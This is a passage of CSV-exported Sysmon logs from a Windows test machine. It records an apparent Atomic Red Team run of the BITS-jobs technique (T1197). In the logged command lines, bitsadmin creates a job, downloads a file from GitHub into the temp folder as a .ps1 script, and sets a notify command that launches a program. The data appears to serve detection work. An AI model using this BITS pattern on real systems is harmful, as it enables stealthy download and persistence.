      ",-,2023-12-27T22:18:24.2450349Z,,Dns query (rule: DnsQuery),,5164,NT AUTHORITY\SYSTEM,S-1-5-18,2023-12-27 14:54:04.817,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>22</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>22</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:18:24.2450349Z""/>
      <EventRecordID>19590</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5164""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 14:54:04.817</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-4451-658c-6d01-000000000f00}</Data>
      <Data Name=""ProcessId"">4136</Data>
      <Data Name=""QueryName"">raw.githubusercontent.com</Data>
      <Data Name=""QueryStatus"">0</Data>
      <Data Name=""QueryResults"">::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.111.133;::ffff:185.199.110.133;</Data>
      <Data Name=""Image"">C:\Windows\System32\svchost.exe</Data>
      <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Dns query:

RuleName: -

UtcTime: 2023-12-27 14:54:04.817

ProcessGuid: {f57bd86a-4451-658c-6d01-000000000f00}

ProcessId: 4136

QueryName: raw.githubusercontent.com

QueryStatus: 0

QueryResults: ::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.111.133;::ffff:185.199.110.133;

Image: C:\Windows\System32\svchost.exe

User: NT AUTHORITY\SYSTEM</Message>
      <Level>Information</Level>
      <Task>Dns query (rule: DnsQuery)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,ping  -n 5 127.0.0.1  ,Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,TCP/IP Ping Command,1,19589,10.0.22621.2506 (WinBuild.160101.0800),"MD5=D093BFD165180335D56E801D7D473957,SHA256=01A0A7A7735E15C1904768312E9F06E0611D8F33EC82DE1065E994085FBDD5E0,IMPHASH=B6D7A8608EB157A75A07192C7838695C",C:\Windows\System32\PING.EXE,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 22:18:21.151

ProcessGuid: {f57bd86a-a2ad-658c-d401-000000000f00}

ProcessId: 10536

Image: C:\Windows\System32\PING.EXE

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: TCP/IP Ping Command

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: ping.exe

CommandLine: ping  -n 5 127.0.0.1  

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=D093BFD165180335D56E801D7D473957,SHA256=01A0A7A7735E15C1904768312E9F06E0611D8F33EC82DE1065E994085FBDD5E0,IMPHASH=B6D7A8608EB157A75A07192C7838695C

ParentProcessGuid: {f57bd86a-a2ac-658c-ce01-000000000f00}

ParentProcessId: 10092

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c bitsadmin.exe /create AtomicBITS & bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\bitsadmin3_flag.ps1 & bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe NULL & bitsadmin.exe /resume AtomicBITS & ping -n 5 127.0.0.1 >nul 2>&1 & bitsadmin.exe /complete AtomicBITS

ParentUser: WINDEV2309EVAL\User",Info,ping.exe,"""cmd.exe"" /c bitsadmin.exe /create AtomicBITS & bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\bitsadmin3_flag.ps1 & bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe NULL & bitsadmin.exe /resume AtomicBITS & ping -n 5 127.0.0.1 >nul 2>&1 & bitsadmin.exe /complete AtomicBITS",C:\Windows\System32\cmd.exe,{f57bd86a-a2ac-658c-ce01-000000000f00},10092,WINDEV2309EVAL\User,{f57bd86a-a2ad-658c-d401-000000000f00},3588,10536,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T22:18:21.1529881Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:18:21.151,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:18:21.1529881Z""/>
      <EventRecordID>19589</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:18:21.151</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a2ad-658c-d401-000000000f00}</Data>
      <Data Name=""ProcessId"">10536</Data>
      <Data Name=""Image"">C:\Windows\System32\PING.EXE</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">TCP/IP Ping Command</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">ping.exe</Data>
      <Data Name=""CommandLine"">ping  -n 5 127.0.0.1  </Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=D093BFD165180335D56E801D7D473957,SHA256=01A0A7A7735E15C1904768312E9F06E0611D8F33EC82DE1065E994085FBDD5E0,IMPHASH=B6D7A8608EB157A75A07192C7838695C</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-a2ac-658c-ce01-000000000f00}</Data>
      <Data Name=""ParentProcessId"">10092</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c bitsadmin.exe /create AtomicBITS &amp; bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\bitsadmin3_flag.ps1 &amp; bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe NULL &amp; bitsadmin.exe /resume AtomicBITS &amp; ping -n 5 127.0.0.1 &gt;nul 2&gt;&amp;1 &amp; bitsadmin.exe /complete AtomicBITS</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 22:18:21.151

ProcessGuid: {f57bd86a-a2ad-658c-d401-000000000f00}

ProcessId: 10536

Image: C:\Windows\System32\PING.EXE

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: TCP/IP Ping Command

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: ping.exe

CommandLine: ping  -n 5 127.0.0.1  

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=D093BFD165180335D56E801D7D473957,SHA256=01A0A7A7735E15C1904768312E9F06E0611D8F33EC82DE1065E994085FBDD5E0,IMPHASH=B6D7A8608EB157A75A07192C7838695C

ParentProcessGuid: {f57bd86a-a2ac-658c-ce01-000000000f00}

ParentProcessId: 10092

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c bitsadmin.exe /create AtomicBITS &amp; bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\bitsadmin3_flag.ps1 &amp; bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe NULL &amp; bitsadmin.exe /resume AtomicBITS &amp; ping -n 5 127.0.0.1 &gt;nul 2&gt;&amp;1 &amp; bitsadmin.exe /complete AtomicBITS

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,bitsadmin.exe  /resume AtomicBITS ,Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,BITS administration utility,1,19588,7.8.22621.1 (WinBuild.160101.0800),"MD5=C62B04C717A3CCF25D0C44BA97C2A6AA,SHA256=7C2365B752F8D2708C737BC34260D5F3D1568FDD2E12892D3CA3E4952ADD0230,IMPHASH=0CAC68DC73A62CA8C76038194D54BF79",C:\Windows\System32\bitsadmin.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 22:18:21.120

ProcessGuid: {f57bd86a-a2ad-658c-d301-000000000f00}

ProcessId: 2960

Image: C:\Windows\System32\bitsadmin.exe

FileVersion: 7.8.22621.1 (WinBuild.160101.0800)

Description: BITS administration utility

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: bitsadmin.exe

CommandLine: bitsadmin.exe  /resume AtomicBITS 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=C62B04C717A3CCF25D0C44BA97C2A6AA,SHA256=7C2365B752F8D2708C737BC34260D5F3D1568FDD2E12892D3CA3E4952ADD0230,IMPHASH=0CAC68DC73A62CA8C76038194D54BF79

ParentProcessGuid: {f57bd86a-a2ac-658c-ce01-000000000f00}

ParentProcessId: 10092

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c bitsadmin.exe /create AtomicBITS & bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\bitsadmin3_flag.ps1 & bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe NULL & bitsadmin.exe /resume AtomicBITS & ping -n 5 127.0.0.1 >nul 2>&1 & bitsadmin.exe /complete AtomicBITS

ParentUser: WINDEV2309EVAL\User",Info,bitsadmin.exe,"""cmd.exe"" /c bitsadmin.exe /create AtomicBITS & bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\bitsadmin3_flag.ps1 & bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe NULL & bitsadmin.exe /resume AtomicBITS & ping -n 5 127.0.0.1 >nul 2>&1 & bitsadmin.exe /complete AtomicBITS",C:\Windows\System32\cmd.exe,{f57bd86a-a2ac-658c-ce01-000000000f00},10092,WINDEV2309EVAL\User,{f57bd86a-a2ad-658c-d301-000000000f00},3588,2960,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T22:18:21.1213737Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:18:21.120,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:18:21.1213737Z""/>
      <EventRecordID>19588</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:18:21.120</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a2ad-658c-d301-000000000f00}</Data>
      <Data Name=""ProcessId"">2960</Data>
      <Data Name=""Image"">C:\Windows\System32\bitsadmin.exe</Data>
      <Data Name=""FileVersion"">7.8.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">BITS administration utility</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">bitsadmin.exe</Data>
      <Data Name=""CommandLine"">bitsadmin.exe  /resume AtomicBITS </Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=C62B04C717A3CCF25D0C44BA97C2A6AA,SHA256=7C2365B752F8D2708C737BC34260D5F3D1568FDD2E12892D3CA3E4952ADD0230,IMPHASH=0CAC68DC73A62CA8C76038194D54BF79</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-a2ac-658c-ce01-000000000f00}</Data>
      <Data Name=""ParentProcessId"">10092</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c bitsadmin.exe /create AtomicBITS &amp; bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\bitsadmin3_flag.ps1 &amp; bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe NULL &amp; bitsadmin.exe /resume AtomicBITS &amp; ping -n 5 127.0.0.1 &gt;nul 2&gt;&amp;1 &amp; bitsadmin.exe /complete AtomicBITS</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 22:18:21.120

ProcessGuid: {f57bd86a-a2ad-658c-d301-000000000f00}

ProcessId: 2960

Image: C:\Windows\System32\bitsadmin.exe

FileVersion: 7.8.22621.1 (WinBuild.160101.0800)

Description: BITS administration utility

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: bitsadmin.exe

CommandLine: bitsadmin.exe  /resume AtomicBITS 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=C62B04C717A3CCF25D0C44BA97C2A6AA,SHA256=7C2365B752F8D2708C737BC34260D5F3D1568FDD2E12892D3CA3E4952ADD0230,IMPHASH=0CAC68DC73A62CA8C76038194D54BF79

ParentProcessGuid: {f57bd86a-a2ac-658c-ce01-000000000f00}

ParentProcessId: 10092

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c bitsadmin.exe /create AtomicBITS &amp; bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\bitsadmin3_flag.ps1 &amp; bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe NULL &amp; bitsadmin.exe /resume AtomicBITS &amp; ping -n 5 127.0.0.1 &gt;nul 2&gt;&amp;1 &amp; bitsadmin.exe /complete AtomicBITS

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,bitsadmin.exe  /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe NULL ,Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,BITS administration utility,1,19587,7.8.22621.1 (WinBuild.160101.0800),"MD5=C62B04C717A3CCF25D0C44BA97C2A6AA,SHA256=7C2365B752F8D2708C737BC34260D5F3D1568FDD2E12892D3CA3E4952ADD0230,IMPHASH=0CAC68DC73A62CA8C76038194D54BF79",C:\Windows\System32\bitsadmin.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 22:18:21.088

ProcessGuid: {f57bd86a-a2ad-658c-d201-000000000f00}

ProcessId: 9684

Image: C:\Windows\System32\bitsadmin.exe

FileVersion: 7.8.22621.1 (WinBuild.160101.0800)

Description: BITS administration utility

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: bitsadmin.exe

CommandLine: bitsadmin.exe  /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe NULL 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=C62B04C717A3CCF25D0C44BA97C2A6AA,SHA256=7C2365B752F8D2708C737BC34260D5F3D1568FDD2E12892D3CA3E4952ADD0230,IMPHASH=0CAC68DC73A62CA8C76038194D54BF79

ParentProcessGuid: {f57bd86a-a2ac-658c-ce01-000000000f00}

ParentProcessId: 10092

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c bitsadmin.exe /create AtomicBITS & bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\bitsadmin3_flag.ps1 & bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe NULL & bitsadmin.exe /resume AtomicBITS & ping -n 5 127.0.0.1 >nul 2>&1 & bitsadmin.exe /complete AtomicBITS

ParentUser: WINDEV2309EVAL\User",Info,bitsadmin.exe,"""cmd.exe"" /c bitsadmin.exe /create AtomicBITS & bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\bitsadmin3_flag.ps1 & bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe NULL & bitsadmin.exe /resume AtomicBITS & ping -n 5 127.0.0.1 >nul 2>&1 & bitsadmin.exe /complete AtomicBITS",C:\Windows\System32\cmd.exe,{f57bd86a-a2ac-658c-ce01-000000000f00},10092,WINDEV2309EVAL\User,{f57bd86a-a2ad-658c-d201-000000000f00},3588,9684,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T22:18:21.0898001Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:18:21.088,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:18:21.0898001Z""/>
      <EventRecordID>19587</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:18:21.088</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a2ad-658c-d201-000000000f00}</Data>
      <Data Name=""ProcessId"">9684</Data>
      <Data Name=""Image"">C:\Windows\System32\bitsadmin.exe</Data>
      <Data Name=""FileVersion"">7.8.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">BITS administration utility</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">bitsadmin.exe</Data>
      <Data Name=""CommandLine"">bitsadmin.exe  /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe NULL </Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=C62B04C717A3CCF25D0C44BA97C2A6AA,SHA256=7C2365B752F8D2708C737BC34260D5F3D1568FDD2E12892D3CA3E4952ADD0230,IMPHASH=0CAC68DC73A62CA8C76038194D54BF79</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-a2ac-658c-ce01-000000000f00}</Data>
      <Data Name=""ParentProcessId"">10092</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c bitsadmin.exe /create AtomicBITS &amp; bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\bitsadmin3_flag.ps1 &amp; bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe NULL &amp; bitsadmin.exe /resume AtomicBITS &amp; ping -n 5 127.0.0.1 &gt;nul 2&gt;&amp;1 &amp; bitsadmin.exe /complete AtomicBITS</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 22:18:21.088

ProcessGuid: {f57bd86a-a2ad-658c-d201-000000000f00}

ProcessId: 9684

Image: C:\Windows\System32\bitsadmin.exe

FileVersion: 7.8.22621.1 (WinBuild.160101.0800)

Description: BITS administration utility

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: bitsadmin.exe

CommandLine: bitsadmin.exe  /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe NULL 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=C62B04C717A3CCF25D0C44BA97C2A6AA,SHA256=7C2365B752F8D2708C737BC34260D5F3D1568FDD2E12892D3CA3E4952ADD0230,IMPHASH=0CAC68DC73A62CA8C76038194D54BF79

ParentProcessGuid: {f57bd86a-a2ac-658c-ce01-000000000f00}

ParentProcessId: 10092

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c bitsadmin.exe /create AtomicBITS &amp; bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\bitsadmin3_flag.ps1 &amp; bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe NULL &amp; bitsadmin.exe /resume AtomicBITS &amp; ping -n 5 127.0.0.1 &gt;nul 2&gt;&amp;1 &amp; bitsadmin.exe /complete AtomicBITS

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
